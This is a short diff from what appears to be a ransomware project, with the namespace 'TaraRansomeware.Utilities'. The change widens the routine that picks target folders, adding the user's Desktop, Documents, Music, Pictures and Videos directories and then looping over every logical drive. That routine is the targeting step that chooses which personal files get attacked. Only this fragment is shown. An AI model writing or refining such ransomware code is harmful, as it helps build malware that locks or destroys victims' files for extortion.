@@ -13,7 +13,11 @@ namespace TaraRansomeware.Utilities
         {
             List<string> lst = new List<string>();
 
-            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
+            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
+            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
+            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
+            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
 
             string[] drives = Environment.GetLogicalDrives();
             foreach(var drive in drives)
